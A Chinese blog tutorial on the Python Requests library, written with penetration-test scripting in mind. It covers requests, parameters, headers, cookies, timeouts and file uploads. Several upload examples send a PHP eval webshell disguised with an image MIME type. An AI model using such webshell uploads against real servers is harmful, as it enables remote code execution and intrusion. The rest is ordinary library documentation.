# 关于Requests库

我不知道我看到的[教程文档](https://requests.readthedocs.io/zh_CN/latest/)是不是官方的，但是一眼看上去就有一种难以形容的感觉....

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-196c29fb32ef4ba883173505b0bba8b6.png)

# 使用方法

与绝大多数第三方库一样，使用Requests库也需要进行安装

使用pip拉取安装:

```bash
$ pip install requests
```

使用pip本地安装:

```bash
$ git clone git://github.com/kennethreitz/requests.git$ cd requests$ pip install .
```

导入模块:

```python
import requests
```

## 请求内容

确认请求类型:

```python
r = requests.get('https://n0b1ta.tk:8888/')		#get请求
r = requests.post('http://n0b1ta.tk:8888/', data = {'key':'value'})	#post请求
r = requests.put('http://n0b1ta.tk:8888/', data = {'key':'value'})	#put请求
r = requests.delete('http://n0b1ta.tk:8888/')	#delete请求
r = requests.head('http://n0b1ta.tk:8888/')		#head请求
r = requests.options('http://n0b1ta.tk:8888/')	#options请求
```

传递URL参数:

如果想要为URL的查询字符串传递某种数据。如果是手工构建URL，那么数据会以键/值对的形式置于 URL 中，跟在一个问号的后面。
例如:

```python
http://n0b1ta.tk:8888/index.php?id=1
```

允许你使用 ***params*** 关键字参数，以一个字符串字典来提供这些参数。举例来说，如果你想传递 id=1和 user=admin到http://n0b1ta.tk:8888/，那么你可以使用如下代码：

```python
import requestspayload = {'id':'1','user':'admin'}
r = requests.get("http://n0b1ta.tk:8888/index.php",params=payload)print(r.url)
```

最后的结果如图所示:

```python
http://n0b1ta.tk:8888/index.php?id=1&user=admin
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-6d061148c6954d6a8641d14d6154e562.png)

当然也容许将一个列表作为值传入:
如下列代码:

```python
import requests
payload = {'id':'1','user':['admin','test','admin1']}
r = requests.get("http://n0b1ta.tk:8888/index.php",params=payload)
print(r.url)
```

则输出:

```python
http://n0b1ta.tk:8888/index.php?id=1&user=admin&user=test&user=admin1
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-92930357433e4fd7921fca5b707d43c1.png)

## 响应内容

requests可以读取到服务器响应的内容。以我的博客为例:

```python
import requests
r = requests.get('http://n0b1ta.tk:8888/')
print(r.text)
```

响应内容如下图：

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-f1acb1c65c5445f7af56e416590408a4.png)

请求发出后，Requests 会基于HTTP头部对响应的编码作出有根据的推测。当你访问 ***r.text*** 之时, ***requests*** 会使用其推测的文本编码。你可以找出 ***requests*** 使用了什么编码，并且能够使用 ***r.encoding*** 属性来改变它：

```python
import requestsr 
r = requests.get('http://n0b1ta.tk:8888/')
print("使用的编码为:",r.encoding)r.encoding = 'GBK'
print("现在使用的编码为:",r.encoding)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-52bb0ac47b49499fbf3ad74ad427a81f.png)

如果你改变了编码，每当访问 ***r.text*** 时，request都会使用你设定的 ***r.encoding*** 的值。如果希望在不同的格式中使用不同的编码，那么可以使用 ***r.content*** 来找到对应的编码，这样就能够正确解析 ***r.text***

## 二进制响应内容

也可以以字节的方式访问非文本的响应内容:

```python
r.content
```

例如我的头像链接:

```python
http://n0b1ta.tk:8888/upload/2020/11/QQ%E5%9B%BE%E7%89%8720201020195739-41bbd3d9a42741938ed3a11007243be3.jpg
```

如果使用文本的方式获取响应内容:

```python
import requests
r = requests.get('http://n0b1ta.tk:8888/upload/2020/11/QQ%E5%9B%BE%E7%89%8720201020195739-41bbd3d9a42741938ed3a11007243be3.jpg')
print(r.text)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-78fbb974423c468c8a58523cf79a45ef.png)

点半天点不开

如果使用 ***r.content*** 来以字节的方式获取响应内容:

```python
import requests
r = requests.get('http://n0b1ta.tk:8888/upload/2020/11/QQ%E5%9B%BE%E7%89%8720201020195739-41bbd3d9a42741938ed3a11007243be3.jpg')
print(r.content)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-41c83f453e6d418599a45315522618ea.png)

当然，虽然成功的被解码，但是还是不能够以一张图片的样子显示，还会把python弄的很卡，所以需要配合其他库来生成图片，例如:

```python
import requests
from PIL import Image
from io import BytesIO
r = requests.get('http://n0b1ta.tk:8888/upload/2020/11/QQ%E5%9B%BE%E7%89%8720201020195739-41bbd3d9a42741938ed3a11007243be3.jpg')
i = Image.open(BytesIO(r.content))
print(i)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-95b56989f5464d5282fd796de2097d5b.png)

## JSON响应内容

requests中也有一个内置的JSON解码器，助你处理JSON数据:

```
r.json()
```

例:

```python
import requests
r = requests.get('https://api.github.com/events')
a = r.json()
print(a)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-bcdb517a8c2948569ac572f0f140121e.png)

**注:** 成功调用 r.json() 并 ***不*** 意味着响应的成功,比如我的博客中没有json的数据，就会抛出一个异常，如果 JSON 解码失败， r.json() 就会抛出一个异常。例如，响应内容是 401 (Unauthorized)，尝试访问 r.json() 将会抛出 ValueError: No JSON object could be decoded 异常。

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-6b35487ad2ea4183a5588b8713f3ca01.png)

## 原始响应内容

在罕见的情况下，你可能想获取来自服务器的原始[套接字](https://baike.baidu.com/item/套接字/9637606?fr=aladdin)响应(可以认为是16进制字节流)，那么你可以使用 r.raw. 如果你确实想这么干，那请你确保在初始请求中设置了 stream=True。具体你可以这么做：

```python
r = requests.get('https://api.github.com/events', stream=True)
r.raw
<requests.packages.urllib3.response.HTTPResponse object at 0x101194810>
r.raw.read(10)
'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
```

但一般情况下，你应该以下面的模式将文本流保存到文件：

```python
with open(filename, 'wb') as fd:
    for chunk in r.iter_content(chunk_size):
        fd.write(chunk)
```

使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是优先推荐的获取内容方式。 请注意，chunk_size可以自由调整为一个可能更适合你使用情况的数字。

## 定制请求头(重点)

如果想为请求添加自定义HTTP头，只要简单地传递一个字典给 ***headers*** 参数就可以了。

最后使用 ***headers*** 关键字调用:

我们使用[UA在线工具测试](http://www.hao828.com/yingyong/getuseragent/)

```python
import requests
headers = {'user-agent':'User-Agent:Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)'}
url = 'http://www.hao828.com/yingyong/getuseragent/'
r = requests.get(url,headers=headers)
print(r.text)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-54298d3809fa4c869222e6a978eb52be.png)

**注意** ：定制 header 的优先级低于某些特定的信息源。
例如：

- 如果在 .netrc 中设置了用户认证信息，使用 headers= 设置的授权就不会生效。而如果设置了 auth= 参数，`.netrc` 的设置就无效了。
- 如果被重定向到别的主机，授权header就会被删除。
- 代理授权header会被URL中提供的代理身份覆盖掉。
- 在我们能判断内容长度的情况下,header的 Content-Length 会被改写。

更进一步讲requests不会基于定制header的具体情况改变自己的行为。只不过在最后的请求中，所有的header信息都会被传递进去。

注意: 所有的 header 值必须是 string、bytestring 或者 unicode。尽管传递unicode header也是允许的，但不建议这样做。

# 更加复杂的 POST 请求（重中之重）

通常POST请求会带着一些POST的表单数据，要实现这个，只需要传递一个字典给 ***data*** 关键字。
例如要登陆我的博客:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
payload = {'user':'admin','password':'admin@123'}
r = requests.post(url,data=payload)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-fc2499b2dd94475dac00fada7caffdc8.png)

也可以传入一个元组给 ***data*** 关键字，适用于多个值对应一个键的情况:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
payload = (('user','admin'),('user','test'))
r = requests.post(url,data=payload)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-c04da75cc4c94210a1fa4b4c0482ec60.png)

很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个字符串而不是一个 ***dict*** ，那么数据会被直接发布出去。

例:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
payload = 'bjBiMXRh5Yiw5q2k5LiA5ri4=='
r = requests.post(url,data=payload)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-d8b7d3ea489e49a38f58a6e044621f7b.png)

在 ***requests2.4.2*** 版，加入了对字典类型的json编码，将他传递给 ***json*** 关键字例如这样:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
payload = {'username':'admin','password':'admin@123','action':'login','code':'123456'}
r = requests.post(url,json=payload)
```

在2.4.2版本前可以使用

```python
import requests
import json
url = 'http://www.n0b1ta.tk:8888/'
payload = {'username':'admin','password':'admin@123','action':'login','code':'123456'}
r = requests.post(url, data=json.dumps(payload))
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-080be67b5c2b49e682cdb624e7bdaa15.png)

POST一个多部分编码(Multipart-Encoded)的文件

requests使上传多部份编码文件变得简单,你只需要将一个文件打开后(字典的形式)传递给 ***files*** 关键字:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
payload = {'file':open('webshell.php','rb')}
r = requests.post(url,files=payload)
```

需要指定打开文件的路径或者放在当前py文件目录下，这个不用我说了吧

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-080be67b5c2b49e682cdb624e7bdaa15-163764300503721.png)

还可以设置文件名，文件类型和请求头格式:

```python
{'file':('文件名',open('本地文件名','rb'),'文件类型',{'请求头值':'请求头值'})}
```

例:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
payload = {'file':('webshell.jpg',open('webshell.php','rb'),'image/jpeg',{'Expires':'0'})}
r = requests.post(url,files=payload)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-1d3c67f5d9fe47ceb8c9df27db260968.png)

还可以不使用本地文件，而构造文件内容发送:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
payload = {'file':('webshell.php',"<?php @eval($_POST[\'admin@123\']); ?>",'image/jpeg')}
r = requests.post(url,files=payload)
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-72fcbda55f3f43ce8c79bfebd22b2062.png)

**注意**：

默认下requests不支持非常大的文件作为 multipart/form-data 请求，但是有个第三方包 ***requests-toolbelt*** 是支持的，详见:[toolbelt 文档](https://toolbelt.readthedocs.io/en/latest/)

你也可以使用一个多文件field叫做”images"的关键字来使用数组传输多个文件:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
payload = [
    ('images',('webshell.php',"<?php @eval($_POST[\'admin@123\']); ?>",'image/png')),
    ('images',('phpinfo.php',"<?php phpinfo();",'image/png'))]
r = requests.post(url,files=payload)
```

![image-20211123125530166](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-20211123125530166.png)

## 响应状态码

可以使用 ***status_code*** 方法来返回请求的响应码

例:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
r = requests.get(url)
a = requests.get('http://www.n0b1ta.tk:8888/notfound')
print("当前网页的状态码为:",r.status_code)
if r.status_code == 200:
    print("不存在的页面的状态码为:",a.status_code)
````

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-330d1b87e1a140d1a3b406b260a36e6f.png)

当然requests库也附带了一个内置的状态码查询方法 

***requests.codes.ok*** 和一个在请求错误时(4xx or 5xx)时抛出异常的方法 ***raise_for_status()***

例如:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
r = requests.get(url)
a = requests.get('http://www.n0b1ta.tk:8888/notfound')
if r.status_code == requests.codes.ok:
    print("R—Get请求发送正常")
if a.status_code != requests.codes.ok:
    print ("A—Get请求发送错误,状态码为:",a.status_code)
```

抛出异常(当状态码为200时,raise_fro_status()返回为None):

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
r = requests.get(url)
a = requests.get('http://www.n0b1ta.tk:8888/notfound')
r.raise_for_status()
if r.status_code == requests.codes.ok:
    print("R—Get请求发送正常")
a.raise_for_status()
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-bb5a0a74efae4d819aec1659a5a9f04f.png)

## 响应头

可以使用 ***headers*** 方法查看目标URL的响应头(大小写不敏感)

例:

```python
import requests
url = 'http://www.n0b1ta.tk:8888/'
r = requests.get(url)
print(r.headers)
print("该服务器支持的请求有:",r.headers['Access-control-allow-Methods'])
```

![image.png](../assets/2021-01-15-Python-Requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/image-68d27fe508ed4865a5c3f46e0d4d30b3.png)

## 设置COOKIE

```python
import requests
url = 'http://n0b1ta.tk:8888/'
r = requests.get(url)
print('当前cookie为:',r.cookies)
cookie = {'username':'admin','password':'admin@123'}
cookie1 = 'cookie:dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9YWRtaW5AMTIz'
a = requests.get(url,cookies=cookie)
print('使用字典方式修改后的cookie为:',a.cookies)
print('使用requests.utils.dict_from_cookiejar()调用的cookie为:',requests.utils.dict_from_cookiejar(a.cookies))
jar = requests.cookies.RequestsCookieJar()
jar.set('cookie','dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9YWRtaW5AMTIz',domain='n0b1ta.tk',path='/')
b = requests.get(url,cookies=jar)
print(requests.utils.dict_from_cookiejar(b.cookies))
```

具体参考[cookie设置](https://requests.readthedocs.io/zh_CN/latest/user/quickstart.html#cookie)

## 重定向

***status_code*** 默认会处理所有重定向返回重定向后的状态码，使用 ***history*** 方法可以查看重定向之前的状态码,如果使用的是 `GET` 、 `OPTIONS` 、 `POST` 、`PUT` 、 `PATCH` 或者 `DELETE` ，那么你可以通过 ***allow_redirects*** 参数禁用重定向处理

例如:

```python
import requests
url = 'http://github.com'
r = requests.get(url)
print('重定向后的状态码为:',r.status_code)
print('重定向前的状态码为:',r.history)
a = requests.get(url,allow_redirects=False)
print('设置禁止重定向后的状态码为:',a.status_code)
```

## 超时(重要)

可以设定在经过 ***timeout*** 参数设定的秒数时间之后停止等待响应
在超过5秒后连接将会断开:

```python
r = requests.get('http://n0b1ta.tk:8888/', timeout=5)
```

如果想要区别连接时间与响应时间，那么传入一个元组即可，例如:

```python
r = requests.get('http://n0b1ta.tk:8888/', timeout=(3.05, 27))
```

如果想要设定不超时，那么传入一个 ***None*** 作为 ***timeout*** 的值即可

```python
r = requests.get('http://n0b1ta.tk:8888/', timeout=None)
```



## 高级用法

因为我暂时不接触开发，只是用于编写渗透测试脚本，用于那些脚本的高级内容已经被我合并在了上面，如果需要可以自己查看[高级内容](https://requests.readthedocs.io/zh_CN/latest/user/advanced.html#advanced)

# 实战运用

- 先去吃饭，回来再说，没想到这一顿饭吃了大半年
